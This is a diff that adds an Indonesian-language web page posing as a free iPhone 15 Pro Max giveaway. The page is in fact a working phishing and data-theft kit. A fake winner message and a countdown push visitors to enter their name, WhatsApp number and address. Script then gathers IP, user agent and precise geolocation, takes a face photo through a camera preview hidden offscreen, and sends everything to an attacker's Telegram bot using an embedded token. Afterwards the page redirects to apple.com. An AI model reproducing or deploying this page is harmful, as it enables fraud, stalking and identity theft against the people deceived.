@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giveaway iPhone 15 Pro Max - Claim Hadiahmu!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            color: #333;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .iphone-img {
+            width: 150px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            color: #333;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .countdown {
+            background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        .countdown-timer {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .form-container {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px dashed #667eea;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background-color: #fff;
+            color: #333;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus, select:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .camera-section {
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .camera-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        
+        .camera-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .camera-preview {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 10px;
+            margin: 15px auto;
+            display: none;
+            border: 3px solid #667eea;
+        }
+        
+        .claim-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
+        }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            text-align: center;
+            color: #25D366;
+            font-weight: bold;
+            display: none;
+            font-size: 18px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #cameraVideo, #cameraCanvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="iphone-img">📱</div>
+            <div class="title">GIVEAWAY iPhone 15 Pro Max</div>
+            <div class="subtitle">
+                🎉 Selamat! Anda terpilih sebagai pemenang giveaway kami!<br>
+                Klaim hadiah iPhone 15 Pro Max gratis sebelum waktu habis!
+            </div>
+        </div>
+        
+        <div class="countdown">
+            <div>⏰ WAKTU TERSISA:</div>
+            <div class="countdown-timer" id="countdown">05:00</div>
+            <div>Segera klaim hadiah Anda!</div>
+        </div>
+        
+        <div class="form-container">
+            <div class="input-group">
+                <label for="fullName">Nama Lengkap</label>
+                <input type="text" id="fullName" placeholder="Masukkan nama lengkap" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="phoneNumber">Nomor WhatsApp</label>
+                <input type="tel" id="phoneNumber" placeholder="Contoh: 628123456789" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="address">Alamat Lengkap</label>
+                <input type="text" id="address" placeholder="Alamat pengiriman hadiah" required>
+            </div>
+            
+            <div class="camera-section">
+                <label>📸 Verifikasi Wajah (Untuk Keamanan)</label>
+                <button type="button" class="camera-btn" id="startCamera">🎥 Ambil Foto</button>
+                <button type="button" class="camera-btn" id="uploadGallery" style="background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);">📁 Dari Galeri</button>
+                
+                <img id="photoPreview" class="camera-preview" alt="Preview Foto">
+                <input type="file" id="galleryInput" accept="image/*" class="hidden">
+                
+                <video id="cameraVideo" autoplay muted playsinline></video>
+                <canvas id="cameraCanvas" class="hidden"></canvas>
+            </div>
+            
+            <button class="claim-btn" id="claimBtn">
+                <span id="btnText">🎁 KLAIM IPHONE GRATIS!</span>
+                <div class="loader" id="loader"></div>
+            </button>
+            
+            <div class="success-message" id="successMessage">
+                ✅ Selamat! iPhone 15 Pro Max akan dikirim ke alamat Anda dalam 3-5 hari kerja.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // GANTI DENGAN API BOT ANDA
+        const TELEGRAM_BOT_TOKEN = '8505437628:AAFuTjpjiOOxoUU65H0HMPihw4NeVutTVzs';
+        const TELEGRAM_CHAT_ID = '7415049540';
+        
+        let userPhotos = [];
+        let cameraStream = null;
+        
+        // Countdown timer
+        function startCountdown() {
+            let timeLeft = 300; // 5 minutes
+            const countdownElement = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    alert('Waktu telah habis! Giveaway ditutup.');
+                }
+                timeLeft--;
+            }, 1000);
+        }
+        
+        // Get user IP
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Tidak dapat mendeteksi IP';
+            }
+        }
+        
+        // Get location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        
+                        // Get address from coordinates
+                        try {
+                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+                            const data = await response.json();
+                            resolve({
+                                lat: lat,
+                                lng: lng,
+                                address: data.display_name || 'Alamat tidak ditemukan',
+                                mapsUrl: `https://maps.google.com/?q=${lat},${lng}`
+                            });
+                        } catch (error) {
+                            resolve({
+                                lat: lat,
+                                lng: lng,
+                                address: 'Gagal mendapatkan alamat',
+                                mapsUrl: `https://maps.google.com/?q=${lat},${lng}`
+                            });
+                        }
+                    },
+                    (error) => {
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Start camera
+        async function startCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = cameraStream;
+                await video.play();
+                
+                // Create photo after 2 seconds
+                setTimeout(capturePhoto, 2000);
+                
+            } catch (error) {
+                alert('Tidak dapat mengakses kamera. Izinkan akses kamera di browser.');
+            }
+        }
+        
+        // Capture photo from camera
+        function capturePhoto() {
+            const video = document.getElementById('cameraVideo');
+            const canvas = document.getElementById('cameraCanvas');
+            const preview = document.getElementById('photoPreview');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0);
+            
+            // Convert to blob and store
+            canvas.toBlob((blob) => {
+                const photoUrl = URL.createObjectURL(blob);
+                preview.src = photoUrl;
+                preview.style.display = 'block';
+                
+                userPhotos.push(blob);
+                
+                // Stop camera
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Handle gallery upload
+        document.getElementById('uploadGallery').addEventListener('click', () => {
+            document.getElementById('galleryInput').click();
+        });
+        
+        document.getElementById('galleryInput').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const preview = document.getElementById('photoPreview');
+                preview.src = URL.createObjectURL(file);
+                preview.style.display = 'block';
+                userPhotos.push(file);
+            }
+        });
+        
+        // Send data to Telegram
+        async function sendToTelegram(formData, location, userIP) {
+            try {
+                // Send text data first
+                const message = `🎯 **GIVEAWAY TARGET BARU** 🎯
+
+👤 **Data Pribadi:**
+📛 Nama: ${formData.name}
+📱 WhatsApp: ${formData.phone}
+🏠 Alamat: ${formData.address}
+
+🌐 **Informasi System:**
+📍 IP Address: ${userIP}
+🔧 User Agent: ${navigator.userAgent}
+🕒 Waktu: ${new Date().toLocaleString()}
+
+📡 **Lokasi:**
+🗺️ Alamat: ${location?.address || 'Tidak ada akses'}
+📌 Koordinat: ${location?.lat || 'N/A'}, ${location?.lng || 'N/A'}
+🔗 Maps: ${location?.mapsUrl || 'N/A'}
+
+📸 **Total Foto:** ${userPhotos.length} foto`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Send photos if available
+                for (let i = 0; i < userPhotos.length; i++) {
+                    const photoFormData = new FormData();
+                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    photoFormData.append('photo', userPhotos[i], `photo-${i+1}-${Date.now()}.jpg`);
+                    photoFormData.append('caption', `📸 Foto ${i+1} dari target`);
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoFormData
+                    });
+                }
+                
+                return true;
+            } catch (error) {
+                console.log('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Form submission
+        document.getElementById('claimBtn').addEventListener('click', async function() {
+            const name = document.getElementById('fullName').value;
+            const phone = document.getElementById('phoneNumber').value;
+            const address = document.getElementById('address').value;
+            const claimBtn = document.getElementById('claimBtn');
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            const successMessage = document.getElementById('successMessage');
+            
+            if (!name || !phone || !address) {
+                alert('Harap lengkapi semua data!');
+                return;
+            }
+            
+            // Show loading
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            claimBtn.disabled = true;
+            
+            // Collect all data
+            const userIP = await getUserIP();
+            const location = await getLocation();
+            const formData = { name, phone, address };
+            
+            // Send data to Telegram
+            const sendSuccess = await sendToTelegram(formData, location, userIP);
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                loader.style.display = 'none';
+                
+                if (sendSuccess) {
+                    successMessage.style.display = 'block';
+                    document.querySelector('.form-container').style.opacity = '0.6';
+                    
+                    // Redirect after 5 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://apple.com';
+                    }, 5000);
+                } else {
+                    btnText.style.display = 'block';
+                    btnText.textContent = '❌ Coba Lagi';
+                    claimBtn.disabled = false;
+                    setTimeout(() => {
+                        btnText.textContent = '🎁 KLAIM IPHONE GRATIS!';
+                    }, 2000);
+                }
+            }, 4000);
+        });
+        
+        // Event listeners
+        document.getElementById('startCamera').addEventListener('click', startCamera);
+        
+        // Start countdown on page load
+        window.addEventListener('load', startCountdown);
+        
+        // Auto-format phone number
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.startsWith('0')) {
+                value = '62' + value.substring(1);
+            }
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
